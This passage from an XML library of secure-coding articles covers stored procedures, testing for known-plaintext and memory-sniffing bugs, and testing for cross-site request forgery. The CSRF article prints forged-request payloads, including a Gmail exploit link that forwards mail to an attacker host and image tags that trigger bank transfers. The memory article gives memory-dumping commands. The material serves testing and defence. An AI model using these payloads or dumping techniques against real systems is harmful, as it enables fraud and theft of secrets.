expressions, and ASP.NET validation controls, see "Input Validation" in Chapter 10, "Building Secure ASP.NET Pages and Controls." at <a href="http://msdn2.microsoft.com/en-us/library/aa302426.aspx">http://msdn2.microsoft.com/en-us/library/aa302426.aspx</a>&nbsp;</p><h1>Additional Resources</h1><ul><li>For more information see, "Chapter 4 - Design Guidelines for Secure Web Applications" at <a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx">http://msdn2.microsoft.com/en-us/library/aa302420.aspx</a>&nbsp;&nbsp; </li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1144832239" Content_Hash="-899946418">
    <Metadata>
      <Id>fea6be3f-5d03-4400-b4a6-c23db56863a3</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use Stored Procedures</Title>
      <Category>Data Access</Category>
      <Phase>Implementation</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Applications written using Servlets or JSP.</li></ul><h1>What to Do</h1><p>Always use stored procedures when interacting with a database. This increases performance and reduces the risk of a successful SQL injection attack.</p><h1>Why</h1><p>Attackers can use a <a href="ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764">SQL Injection Attack</a> to manipulate the database in unforeseen ways. SQL injection allows an attacker to assume the credentials of the SQL account used to connect to the database, which may lead to arbitrary reading, writing, updating or deleting of data. In an improperly secured database, this can also lead to remote code execution through the use of certain stored procedures that allow for direct Operating System command injection.</p><h1>When</h1><p>Stored procedures should be used whenever interaction with a database is required.</p><h1>How</h1><ol><li><strong>Create the stored procedure on the database. </strong>This can be done using the following SQL syntax:<br><br>Since stored procedures reside on the database server, you need to create the appropriate stored procedures on your application's database server. The following example creates a stored procedure on an Oracle database server: </li><blockquote><blockquote><pre>CREATE OR REPLACE PROCEDURE<br> PlaceOrder(custID INT, itemID INT, qty INT)<br> ISBEGIN<br>   INSERT INTO PendingPurchases (customer, item, quantity)<br>    VALUES (custID, itemID, qty);END PlaceOrder;</pre></blockquote></blockquote><li><div><strong>Call the stored procedure. </strong>This can be done&nbsp;using the following Java code:</div></li><blockquote><blockquote><pre>Connection cn = MyApp.getDBConnection();<br>PreparedStatement st = cn.prepareStatement("exec PlaceOrder(?, ?, ?);");<br>st.setInt(1, custID);<br>st.setInt(2, itemID);<br>st.setInt(3, qty);<br>ResultSet rs = st.executeQuery();</pre></blockquote></blockquote><li><div><strong>Assign the appropriate permissions. </strong>Once you have created the stored procedure, assign the appropriate permissions on the database server. Using the example above, allow your application to execute <strong>PlaceOrder</strong> and deny it access to <strong>PendingPurchases</strong>. Example:</div></li><br><blockquote><blockquote><pre>REVOKE ALL ON PendingPurchases FROM myapp;<br>GRANT EXECUTE ON PlaceOrder TO myapp;</pre></blockquote></blockquote><ul></ul></ol><h1>Problem Example</h1><p>The following code places a new order into the application's backend database. Because the application does not use stored procedures, the developers need to grant extra priviliges to the application to allow it to directly manipulate data inside the <strong>PendingPurchases</strong> table.</p><blockquote><pre>Connection cn = MyApp.getDBConnection();<br>PreparedStatement st = cn.prepareStatement("insert into PendingPurchases "<br>                      + "(customer, item, quantity) values (?, ?, ?);");<br>st.setInt(1, custID);st.setInt(2, itemID);st.setInt(3, qty);</pre></blockquote><h1>Solution Example</h1><p>The following code places a new order into the application's backend database. Because the application uses stored procedures, the developers can allow the application to manipulate the data inside <strong>PendingPurchases</strong> without giving permissions to directly do so, therefore, further restricting the set of operations that the application can execute on the database server.</p><blockquote><pre>Connection cn = MyApp.getDBConnection();<br>PreparedStatement st = cn.prepareStatement("exec PlaceOrder(?, ?, ?);");<br>st.setInt(1, custID);st.setInt(2, itemID);st.setInt(3, qty);</pre></blockquote><h1>Additional Resources</h1><ul><li>To learn more about stored procedures, visit: <a href="http://en.wikipedia.org/wiki/Stored_procedure">Stored procedure</a>. </li><li>To learn more about the PL/SQL syntax and stored procedures, visit: <a href="http://download-uk.oracle.com/docs/cd/B19306_01/appdev.102/b14261/toc.htm">Oracle Database PL/SQL User's Guide and Reference</a>.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:9DF701E2-7929-4533-9DC3-368AAC4E553D">Guideline: Use Type Safe SQL Parameters When Constructing SQL Queries (Java Web Application)</a> </li><li><a href="ruledisplay:81491E66-67B7-49F3-BDA6-4B4C9245C702">Guideline: Validate All Input Passed to Database (Java Web Application)</a> </li><li><a href="ruledisplay:8515588C-661A-4962-853F-6CD6ABCD8CF6">Attack: Server-Side Code Injection Attack</a> </li><li><a href="ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764">Attack: SQL Injection Attack</a> </li><li><a href="ruledisplay:AA3B4801-99BA-43B0-90A6-D38A605E8574">Checklist Item: Type Safe SQL Parameters are Used (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1230187256" Content_Hash="-752372723">
    <Metadata>
      <Id>03909323-d17b-4d4e-be83-15eb7cf6733f</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Test for Known Plaintext Bugs</Title>
      <Category>Cryptography</Category>
      <Phase>Test</Phase>
      <Technology> Any</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to:</h1><ul><li>Public and private key encryption systems.<strong></strong></li></ul><p><strong>&nbsp;</strong></p><h1>Summary</h1><p>In known plaintext attacks the adversary knows both the plaintext and its equivalent ciphertext, and then uses both to calculate a secret cryptographic variable such as the encryption key.&nbsp;&nbsp; Known plaintext bugs are simple to exploit as the attacker doesn’t need to force the victim into encrypting any particular chosen plaintext.</p><p>The following steps are recommended to test for known plaintext bugs:</p><ul><li>Step 1:&nbsp; Understand Attack Scenarios</li><li>Step 2:&nbsp; Analyze Root Causes and Mitigations</li><li>Step 3:&nbsp; Start Testing and Exploring</li><li>Step 4:&nbsp; Tune Test Cases</li></ul><p><strong>&nbsp;</strong></p><h1>Step 1:&nbsp; Understand Attack Scenario </h1><p>First, you need to understand the details of known plaintext attacks.&nbsp; In the common known plaintext attack scenario the adversary’s goal is to recover the encryption key.&nbsp; The scenario starts with the attacker selecting the victim and discovering the plaintext that the victim encrypts.&nbsp; The attacker then waits until the victim encrypts the plaintext and observes the resulting ciphertext.&nbsp; Then, the attacker uses both the plaintext and ciphertext to recover the encryption key that satisfies the next equation:</p><p><em>C = E(K, P)</em></p><p>Where <em>E </em>stands for the encryption routine that converts plaintext <em>P</em> in to ciphertext <em>C</em> using the encryption key<em> K.</em></p><p>If the adversary is able to compute the encryption key, he can use it to decrypt an unknown ciphertext, as the following equation demonstrates:</p><p><em>Pu</em><em>&nbsp;= D(K, Ck)</em></p><p>Where <em>D </em>stands for the decryption routine that converts a known ciphertext <em>Ck </em>to the unknown plaintext <em>Pu</em> to using the encryption key<em> K.</em></p><p>The adversary is able to decrypt any ciphertext created using the stolen key, including potentially sensitive data such as passwords and credit card numbers.<em></em></p><p><strong>&nbsp;</strong></p><h2>Step 2:&nbsp; Analyze Root Cause and Mitigations</h2><p>As the section’s name indicates, the success of plaintext attacks depends on <em>knowing</em> the plaintext that is encrypted.&nbsp; It may seem improbable that an adversary gains knowledge of any plaintext; yet nonetheless there are some circumstances where this can happen.&nbsp; For instance, if the victim is out of the office and has an auto-reply email message configured; the attacker may very well know what the message looks like before it’s encrypted.&nbsp; Another common example is where the victim sends an email to a group of people including the attacker.&nbsp; The attacker can then read the plaintext sent to him, and the ciphertext sent to everybody else.&nbsp; &nbsp;</p><p>An additional attack might consist of the attacker sniffing an email conversation between two people exchanging an encrypted document as part of a review process.&nbsp; When the document is published the attacker can compare the plaintext publication with the latest version of the encrypted file.&nbsp; &nbsp;<em>Partially known</em> plaintext attacks occur when the adversary knows part of the plaintext such as headers of IP packets, the beginning of emails, etc.&nbsp; There are different ways for an adversary to know the plaintext in use - a root cause for this vulnerability is any situation which allows the adversary to be aware of such plaintext.</p><p>There are no clear mitigations against these attacks as most of the causes happen by design.&nbsp; For instance, email servers provide the functionality to have auto-reply messages.&nbsp; Furthermore, in the case where the victim sends the attacker a copy of a group email, there is no way to prevent the victim from emailing the attacker if the attacker is part of the group.&nbsp; Consider the case where the attacker sniffs an encrypted document in review: possible mitigations for this attack require higher level analysis and education, such as requiring the people involved in the document review to check the document in to an Intranet portal or similar mechanism rather than transferring it back and forth via email.&nbsp; </p><p>&nbsp;</p><h1>Step 3:&nbsp; Start Testing and Exploring </h1><p>Now that you’ve learned what known plaintext attacks look like and the reasons why they exist, you must test for both secure and insecure implementations.</p><p>The basic known plaintext security testing follows these steps:</p><ol><li>Select the victim.</li><li>Read plaintext before the victim encrypts it.</li><li>Read the ciphertext after the victim encrypts it.</li><li>Use the plaintext and ciphertext to calculate the encryption key.</li></ol><p><em>Expected result:</em>&nbsp; The system protects against reading the plaintext before it is encrypted in step 2.&nbsp; The test fails if you can execute step 2.</p><p>It is important that during this step you explore the encryption routine used by the system under test.&nbsp; For example, you can check the size of the data before and after encryption.&nbsp; If the encryption routine doesn’t modify the data size then the plaintext and ciphertext have the same size.&nbsp; You can later compare the sizes as a preliminary check to see if the ciphertext matches the known plaintext. </p><p>Another way to test for known plaintext bugs is to become a valid user of the encryption system.&nbsp; For instance, picture a system that has multiple clients and uses a different key to talk to each client.&nbsp; After becoming a valid client, you can configure a network monitor to see how the server application communicates with you.&nbsp; In most cases, server applications use the same protocol to talk to multiple clients, so parts of the network packets (such as headers) will be constant.&nbsp; You can read these headers in plaintext as they arrive to you or as ciphertext as they arrive to each client, and use this pair of collected data to execute an attack on a client’s private key.&nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;</p><h1>Step 4:&nbsp; Tune Test Cases</h1><p>Like any vulnerability, the amount of testing for known plaintext attacks depends on their risk.&nbsp; In some cases they represent no obvious risk; the time to compute the key using any known cryptanalysis in systems using large keys and a trusted encryption algorithm may be too great to represent a high risk.&nbsp; However, some systems are mission critical, hermetic, or self contained, and in such cases any possible knowledge of the plaintext before it is encrypted can pose a high risk.&nbsp;&nbsp; </p><p>You must also decide what your attack goals are before testing.&nbsp; Make sure to define the attack’s goal in each test case (such as breaking a client’s key, the server’s key, or both.)&nbsp; Some keys are more critical to the security of the system under test than others, and you can use this fact to tune your test cases.</p><p><strong>&nbsp;</strong></p><h1>Conclusions</h1><p>Known plaintext attacks are cryptographic attacks in which the adversary knows the plaintext before it is encrypted.&nbsp; The goal of the attack is to calculate the encryption key to gather additional sensitive data.&nbsp; To test for these attacks, you need to understand their attack scenarios as well as their root causes and mitigations.&nbsp; Then, start testing from the ground up, such as checking message data lengths, and then additional approaches should be used such as becoming a legitimate client of the system and analyzing the format of the encrypted text that is being transmitted.&nbsp; Make sure to tune your test cases based on the sensitivity of the particular encryption key, and the risk potential of an attacker stealing it.<strong><span style="text-decoration:underline"></span></strong></p><p><strong>&nbsp;</strong></p><p><strong>&nbsp;</strong></p><p><strong>&nbsp;</strong></p><p>&nbsp;</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="97834077" Content_Hash="-40124326">
    <Metadata>
      <Id>34a67410-3d1c-4e98-886a-bbb2be1b71dc</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Test for Memory Sniffing Bugs</Title>
      <Category>Information Disclosure</Category>
      <Phase>Test</Phase>
      <Technology> Any</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>All software applications </li></ul><p>&nbsp;</p><h1>Summary</h1><p>Applications must store sensitive data such as passwords or cryptographic values in system memory in order to properly operate. However, secrets may be stored in memory that is accessible to an attacker or swapped out of memory and into swaps files. During this attack, the attacker sniffs the different types of memory available, including random access memory (RAM), virtual memory, dump files, and swap files in an attempt to recover sensitive information such as passwords or cryptographic keys.</p><p>It is recommended that you follow these steps in order to test for this bug:</p><ul><li>Step 1: Understand attack scenarios </li><li>Step 2: Analyze causes and countermeasures </li><li>Step 3: Start testing and exploring </li><li>Step 4: Execute additional testing</li></ul><p><strong>&nbsp;</strong></p><h1>Step 1: Understand attack scenarios</h1><p>First, it is necessary to properly understand the types of temporary memory related to this vulnerability:</p><ul><li>RAM - physical memory that stores data used by running processes. </li><li>Virtual memory - logical address space given by the system to each running process. It gets copied into random access memory and swapped out to swap files by the operating system. </li><li>Swap files - RAM’s auxiliary storage. The operating system performs paging to swap the contents of RAM in and out of swap files. </li><li>Memory dumps - Memory dumps are snapshots of a process’s virtual memory; they are created by the system when the process crashes.&nbsp;</li></ul><p>Note that permanent storage of user files, databases, and the Windows registry is outside of the scope of this vulnerability. Permanent memory can be protected using permissions and relate to information disclosure attacks.</p><p>Memory sniffing bugs commonly relate to local attacks requiring access to the target computer. Once the attacker is logged in, he uses a tool to recover sensitive data such as passwords or keys from temporary memory.</p><p>In detail:</p><ol><li>Attacker logs in to target machine.* </li><li>Attacker uses a script or tool to search memory for sensitive data. The attack ends if sensitive data is recovered is an unhashed/unencrypted form. </li><li>If sensitive data is hashed or encrypted, the attacker uses a cryptographic attack to recover sensitive data in plain-text.</li></ol><p>* Variations of this attack focus on capturing sensitive information without access to the target machine. For instance, forensic research shows that the contents of a computer’s RAM can be retrieved through a FireWire cable [i]. Furthermore, recent discoveries indicate that sensitive information from DRAM chips can be restored by removing them after the computer has been turned off.</p><p>&nbsp;</p><h1>Step 2: Analyze Causes and Countermeasures</h1><p>The next step in testing for memory sniffing is to understand what causes this vulnerability and how to countermeasure it.</p><p><strong><em>Clearing data structures containing sensitive information </em></strong></p><p>A classic approach to protect against memory sniffing attacks is to clear data structures, such as arrays, used to temporarily store sensitive information. For instance, the code below is insecure:</p><pre></pre><pre>void GetData(char *MFAddr) { <br>  char pwd[64];<br>&nbsp;  if (GetPasswordFromUser(pwd, sizeof(pwd))) {<br>&nbsp;&nbsp;    if (ConnectToMainframe(MFAddr, pwd)) {<br>&nbsp;<br>&nbsp;    &nbsp;// Interaction with mainframe<br>&nbsp;<br>&nbsp;    &nbsp;}<br>&nbsp;  }<br>}</pre><p>The function <em>GetPasswordFromUser</em> copies a password provided by the user to the <em>pwd</em> character array. The application then returns from the function without cleaning the password from memory. To mitigate this attack, developers are encouraged to set the memory contents to zero after the process is done with the structure used to store it:&nbsp;</p><pre>void GetData(char *MFAddr) { <br>  char pwd[64];<br>&nbsp;  if (GetPasswordFromUser(pwd, sizeof(pwd))) {<br>    if (ConnectToMainframe(MFAddr, pwd)) {<br>&nbsp;<br>&nbsp;    &nbsp;// Interaction with mainframe<br>&nbsp;<br>    &nbsp;&nbsp;}<br>&nbsp;  }<br>&nbsp;  <strong>memset(pwd, 0, sizeof(pwd));<br></strong>}<br></pre><p>However, it is extremely important to know that <em>memset</em> might not work as intended if compiler optimizations are on. Make sure to turn off compiler optimizations if protecting your code using <em>memset</em> as shown above. For more information, refer to <em>OWASP’s Insecure Compiler Optimization </em>[ii].</p><p>Another way of clearing out memory is by traversing the array and setting each element to zero:</p><pre><br>void erase_string(char *s) {</pre><pre>  while(*s) { *s++ = 0; }</pre><pre>}</pre><p>This technique is recommended, because it doesn’t depend on compiler optimizations or knowledge of the array’s size. To properly secure your application, it is suggested that you add similar zeroing-out techniques after returning from function calls that deal with sensitive data and also in every destructor of classes that deal with secrets such as passwords and cryptographic elements.</p><h2><em>Locking sensitive memory </em></h2><p>Zeroing out sensitive memory is an effective technique to keep sensitive data in virtual memory (and consequently in RAM and swap files) as briefly as possible. However, this data might still get swapped by the operating system’s paging system into swap files before the application has a chance to clean it, increasing the risk of harm from a memory sniffing attack. </p><p>It is possible to mitigate this condition by locking virtual address pages from being swapped. This can be achieved in the UNIX platforms by using <em>mlock</em> as below [iii]:</p><pre>#include &lt;sys/mman.h&gt;</pre><pre><br>void *locking_alloc(size_t numbytes) {</pre><pre>  static short have_warned = 0;</pre><pre>&nbsp;  void *mem = malloc(numbytes);</pre><pre><br>  if(mlock(mem, numbytes) &amp;&amp; !have_warned) {<br>&nbsp;<br>    /* We probably do not have permission.<br>&nbsp;&nbsp; &nbsp;       * Sometimes, it might not be possible to lock enough memory.<br>&nbsp;&nbsp; &nbsp;       */</pre><pre>    fprintf(stderr, "Warning: Using insecure memory!\n");<br>&nbsp;&nbsp;&nbsp;    have_warned = 1;<br>&nbsp;<br>  } </pre><pre>  return mem;<br>}</pre><p>In Windows, the Win32 API VirtualLock is used for the same purpose.</p><h2><em>Disable the creation of dump files</em></h2><p>An attacker might execute a memory sniffing attack by crashing an application and accessing the core dumps created by the system upon the crash. Any sensitive data loaded by the application into any data structure will appear in dump files for the attacker to leverage. To mitigate this condition, processes must disable the creation of dump files right from the start. This is achieved using the <em>setrlimit</em> API both in UNIX and Windows platforms [iv]:</p><pre>char pwd[MAX_PWD_LEN];<br>if(setrlimit(RLIMIT_CORE, 0) != 0) {<br>  /* deal with error */<br>}<br>&nbsp;<br>fgets(pwd, MAX_PWD_LEN, stdin);</pre><h2><em>Additional countermeasures</em></h2><p>Additional defenses against memory sniffing attacks include deleting the page file on reboot or shutdown (this can be done by setting a registry value in Windows), and using forensic tools to scrub all different types of system memory. In addition, research is moving towards encrypting the contents of RAM and swap files and storing the encryption key in hardware.</p><p>&nbsp;</p><h1>Step 3: Start Testing and Exploring</h1><p>Now that you understand the basic theory behind memory sniffing attacks, it is necessary to execute practical test cases to check if your application is vulnerable. If you have implemented countermeasures, it is important to execute these tests before and after adding the countermeasures to test their effectiveness.</p><h2><em>Test for sensitive data in RAM</em></h2><p>In Windows platforms, follow these steps to create a record of physical memory in a text file:</p><ol><li>Log into a Windows host running the application under test. </li><li>Download and install ManTech’s Memory DD (<a href="https://sourceforge.net/projects/mdd/)">https://sourceforge.net/projects/mdd/)</a>. </li><li>Open command prompt with administrative privileges. </li><li>Run mdd as follows: <strong>mdd_1.3.exe -o c:\ram.txt -v</strong> </li><li>Once mdd finishes executing, read output file ram.txt for sensitive information.</li></ol><p>Expected results: ram.txt must not show any sensitive data.</p><h2><em>Test for sensitive data in virtual memory</em></h2><p>The best way to search your application’s virtual memory for secrets is to use a debugger to create a dump of the virtual memory space at any given time:</p><ol><li>Log into a Windows host running the application under test. </li><li>Download and run user-mode Windows debugging <em>windbg.</em> </li><li>Attach windbg to the application under test. </li><li>Break into the debugger and specify the option to create a full dump for the application’s virtual memory: <strong>.dump /f c:\dump.txt</strong></li></ol><p>Expected results: dump.txt must not show any sensitive data.</p><h2><em>Test for sensitive data in swap files</em></h2><p>In Windows, swap files are stored in the <em>pagefile:</em> </p><ol><li>Log into a Windows host running the application under test. </li><li>Find pagefile<em>. </em>It is named <em>pagefile.sys</em> and is usually on the root drive of the Windows partition (i.e. c:\pagefile.sys). </li><li>Open read-only copy of a file. </li><li>Search for sensitive information in pagefile.</li></ol><p>Expected results: pagefile must not show sensitive information.</p><h2><em>Test for sensitive data in dump files</em></h2><p>Follow these steps test for sensitive information in dump files:</p><ol><li>Log into a Windows host running the application under test. </li><li>Find the dump files (in Windows, this is indicated in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CrashControl). </li><li>Open a dump file and search for sensitive information. </li><li>Repeat for each of the dump files</li></ol><p>Expected results: dump files must not show sensitive information.</p><p>&nbsp;</p><h1>Step 4: Execute Additional Testing</h1><p>If the sensitive data cannot be easily recognized, you must do additional testing. During each of the tests above, the attacker needs to interpret the output. Running each of the tools creates an output file with a large quantity of data that is irrelevant to the test. A good way to find secrets is running a command such <em>strings</em> on the output file [v] in order to display all character arrays in the file:</p><pre><br>C:\Documents and Settings\All Users\Documents\DrWatson&gt;strings user.dmp<br>12</pre><pre>…<br>kernel32.dll<br>RASAPI32<br>C:\WINNT\tracing<br>C:\Documents and Settings\Administrator\My Documents\PGP\pubring.pkr<br>C:\Documents and Settings\Administrator\My Documents\PGP\secring.skr<br>&amp; !<br>IN PGP MESSAGE-----<br>Version: PGP 7.1<br>qANQR1DBwU4DSL6Q3OHRwOYQB/9pKnnhZGQRFwykWzBO1EWkzW336QOkUaHj0aVj<br>P1MgxDWQWi3kZpOfGnDg6kbQriWBiIgD/z8p5xGN+WcksytlLJv8OxvTGMepx7u8<br>h5aVRXZd8YPM+h5ROpbnNw+SiT/w9oCy/ChWeiCHV1swQSzwBHx2Ye+yxO70Moxc<br>...<br>frAG3nM7kOnChQp4jxhv2J0p7fL1vteI9EGbcimC9QCVBwC1U++mQIqbTyIw5gWK<br>Io11yl8P+wKjcHsLfi2hTE+NIRb+VORWhVoCDHgNKV1nSFNTK0LEnvz84OFyRc1z<br>-----END PGP MESSAGE-----<br><strong>&lt;pgppassphrase!&gt;</strong><br>…<br>&nbsp;</pre><p>Hex editors and similar low-level file processing tools must be used to identify sensitive data. Additional techniques include performing dictionary or linear searches. For example, in Linux refer to <em>Cryptographic Key Recovery from Linux Memory Dumps </em>[vi]<em>.</em></p><p>&nbsp;</p><h1>Conclusions</h1><p>Memory sniffing attacks aim at recovering sensitive data in system memory, including virtual memory, RAM, and swap files.In order to properly test for this bug, it is necessary to understand the anatomy of the attack scenario as well as why it is caused and how to protect against it.Then, you must use a set of available tools to check for it in your application by making records of the different types of memory and searching them for sensitive data.<strong></strong></p><p>&nbsp;<br></p><hr><br><div><div><p>[i] <strong>Hit by a Bus: Physical Access Attacks with Firewire.&nbsp; Adam Boileau.&nbsp; </strong>Security-Assesment.com.&nbsp; <a href="http://www.storm.net.nz/static/files/ab_firewire_rux2k6-final.pdf">http://www.storm.net.nz/static/files/ab_firewire_rux2k6-final.pdf</a><strong></strong></p><p><strong></strong></p><p>[ii] <strong>Insecure Compiler Optimization</strong>. OWASP. <a href="http://www.owasp.org/index.php/Insecure_Compiler_Optimization">http://www.owasp.org/index.php/Insecure_Compiler_Optimization</a></p><p>[iii] <strong>Protecting sensitive data in memory.&nbsp; </strong>John Viega.&nbsp; CGI Security.&nbsp; <a href="http://www.cgisecurity.com/lib/protecting-sensitive-data.html">http://www.cgisecurity.com/lib/protecting-sensitive-data.html</a></p><p>[iv] <strong>VOID MSC14-A. Protect memory when working with sensitive data</strong>. Alex Volkovitsky CERT.&nbsp; <a href="https://www.securecoding.cert.org/confluence/display/seccode/VOID+MSC14-A.+Protect+memory+when+working+with+sensitive+data">https://www.securecoding.cert.org/confluence/display/seccode/VOID+MSC14-A.+Protect+memory+when+working+with+sensitive+data</a></p><p>[v] <strong>Practical Approaches to Recovering Encrypted Digital Evidence. </strong>Eoghan Casey<strong>.&nbsp; </strong><a href="http://www.utica.edu/academic/institutes/ecii/publications/articles/A04AF2FB-BD97-C28C-7F9F4349043FD3A9.pdf">http://www.utica.edu/academic/institutes/ecii/publications/articles/A04AF2FB-BD97-C28C-7F9F4349043FD3A9.pdf</a></p><p>[vi] <strong>Cryptographic Key Recovery from Linux Memory Dumps</strong>. Torbjörn Pettersson.&nbsp; <a href="http://events.ccc.de/camp/2007/Fahrplan/attachments/1300-Cryptokey_forensics_A.pdf">http://events.ccc.de/camp/2007/Fahrplan/attachments/1300-Cryptokey_forensics_A.pdf</a></p><p>&nbsp;</p></div></div>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1375299925" Content_Hash="-1812984050">
    <Metadata>
      <Id>5339f0d4-6052-44a5-9d83-09a116ffdd13</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Test for Cross-Site Request Forgery (CSRF) Bugs</Title>
      <Category>Session Management</Category>
      <Phase>Test</Phase>
      <Technology> Any</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>Andres De Vivanco</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to:</h1><ul><li>Web applications written in languages such as Java, C#, VB .Net, PHP, and Ruby.</li></ul><p>&nbsp;</p><h1>Summary</h1><p>During Cross-Site Request Forgery (CSRF) -also known as <em>XSRF</em> or <em>session riding</em>- attacks, an attacker forces a victim to make an unexpected web request such as a fraudulent bank transaction.&nbsp;&nbsp; For example, an attacker tricks the victim client into calling a banking function in a vulnerable page that transfers money from the victim’s to the attacker’s account.&nbsp; The victim triggers the attack by following an attacker’s link or visiting an attacker’s page.&nbsp; The vulnerable server page doesn’t recheck the authenticity of the victim’s request and allows the transfer to proceed.</p><p>Follow these steps to test for CSRF bugs:</p><ul><li>Step 1:&nbsp; Understand Attack Scenarios </li><li>Step 2:&nbsp; Analyze Causes and Countermeasures </li><li>Step 3:&nbsp; Start Testing and Exploring </li><li>Step 4:&nbsp; Fine-tune Test Cases</li></ul><p>&nbsp;</p><h1>Step 1:&nbsp; Understand Attack Scenarios</h1><p>The first step in testing for CSRF bugs is to understand its attack scenarios.&nbsp; Even though the anatomy of a CSRF attack is almost always constant, its objectives may vary:&nbsp; attackers can exploit CSRF bugs to perform unauthorized fraudulent banking transactions, send spoofed email messages, steal sensitive information, and even install a back door.&nbsp; The following steps detail the anatomy of a CSRF attack:</p><ol><li>Attacker finds functionality in a web application that is vulnerable to CSRF. </li><li>Attacker builds a link invoking the vulnerable function and passing the required parameters as to executed the chosen attack. </li><li>Attacker waits until the victim client authenticates with the vulnerable web application. </li><li>Attacker tricks victim client into following the malicious link. </li><li>Victim client sends forged request to vulnerable server. </li><li>Vulnerable server allows and executes the forged request. </li></ol><p>The form of the link built in step 2 depends on the payload that the attacker wants to execute.&nbsp; For example, the link might looks like this when they payload is to transfer money from the victim’s to the attacker’s account:</p><pre><strong><a>/makeTransfer?amount=1000&amp;dest=attacker@attackersite.com'</a></strong>&nbsp;</pre><p>The link below sends an email titled Hello to johny@example.com: </p><pre><strong>/sendMail?to=johny@example.com&amp;title=Hello&amp;body=I+did+not+send+this'</strong></pre><br><p>A serious flaw discovered in Google’s Gmail early in 2007 allowed attackers to install a backdoor to forward all emails to them.&nbsp; In the link below the attacker forwards the victim to the attacker’s site.&nbsp; Then the attacker’s site makes the fraudulent request in behalf of the victim:</p><pre><strong>http://www.attakersite.org/util/csrf?method=POST&amp;enctype=multipart/form-data&amp;_action=https%3A//mail.google.com/mail/h/ewt1jmuj4ddv/%3Fv%3Dprf&amp;cf2emc=true&amp;cf2_email=attacker@attackersite.com&amp;cf1_from&amp;cf1_to&amp;cf1_subj&amp;cf1has&amp;cf1hasnot&amp;cf1attach=true&amp;tfi&amp;s=z&amp;irf=on&amp;nvpbucftb=Create%20Filter</strong></pre><p>Upon receiving the forged HTTP POST request, Gmail forwards all the victim’s emails to attacker@attackersite.com.&nbsp; Furthermore, the attack installs a filter that works as a backdoor for hijacking future emails.</p><p>&nbsp;</p><h1>Step 2:&nbsp; Analyze Causes and Countermeasures</h1><p>During this step you will be shown the causes behind Cross-Site Request Forgery , &nbsp;how to recognize it within your code base and you will be shown coding best practices, as to avoid this issue altogether.</p><h2><em>Cross-Site Request Forgery Causes</em></h2><p>This kind of vulnerability exists because the web application trusts the forged request.&nbsp; Thus, the cause for this bug is a case of poor or missing authentication code.&nbsp; The application lacks the functionality to verify that every client request is not forged and that it actually originates from a legitimate client action.&nbsp;&nbsp; Web applications vulnerable to CSRF implement a <em>persistent</em> authentication system in which they validate the user against a persistent token such as a session cookie.&nbsp;&nbsp; In persistent authentication, when the server receives a request it only checks if the user is logged in and not if the request comes due to a legitimate client action.</p><h2><em>Cross-Site Request Forgery Countermeasures</em></h2><p>The main prevention against CSRF vulnerabilities is to provide a <em>transient</em> authentication system [i] instead of a persistent authentication system.&nbsp; Transient authentication systems verify for the authenticity of every request by using an additional check.&nbsp;&nbsp; One way of doing this is to transmit a secret in every URL; especially require a secret in URLs that request create, update, delete, or mail actions.&nbsp; An attacker will not be able to execute an attack unless he knows the secret.&nbsp; The problem is that an attacker can execute a XSS attack and steal the secret.</p><p>There is no silver bullet against CSRF attacks so developers need to look for ways of raising the bar against attackers.&nbsp;&nbsp; A popular way to protect Internet users from CSRF is by using <em>CAPTCHAs</em> (Completely Automated Turing Test to Test Computers and Humans Apart) that require the client to validate the contents of a bitmap image before the application allows any requests.</p><p>Other preventions suggested include using POSTs instead of GETs requests to perform actions and or to check the HTTP referrer header.&nbsp; However, both of these countermeasures can be defeated by a knowledgeable attacker since he can easily forge a POST command using a malicious script and can also easily spoof the HTTP referrer.&nbsp; </p><p>&nbsp;</p><h1>Step 3:&nbsp; Start Testing and Exploring</h1><p>Now that you’ve learned how CSRF attacks work and how to defend against them, this step shows the basic test cases to execute to start testing for CSRF bugs.</p><p><strong><em></em></strong></p><h2><em>Basic Test for Cross-site Request Forgery </em></h2><p>Follow these test steps to test against CSRF bugs. <strong><em></em></strong></p><ol><li>Find a web application page that performs an action based on a user request. </li><li>Construct a page containing a link or redirect that sends a forged request to the application server.&nbsp; This link usually contains a tag such as an img or iframe (although mostly any tags can be used) with the source address pointing to the request: <ul><li><pre>&lt;a href="http://bank.com/transfer.do?acct=MARIA&amp;amount=100000"&gt;View my Pictures!&lt;/a&gt;</pre><pre></pre><pre>&lt;img src="http://bank.com/transfer.do?acct=MARIA&amp;amount=100000" width="1" height="1" border="0"&gt;&nbsp;</pre><p>Note that the links above will both generate a GET request.&nbsp; In order to test for POST requests you must create a page containing a form 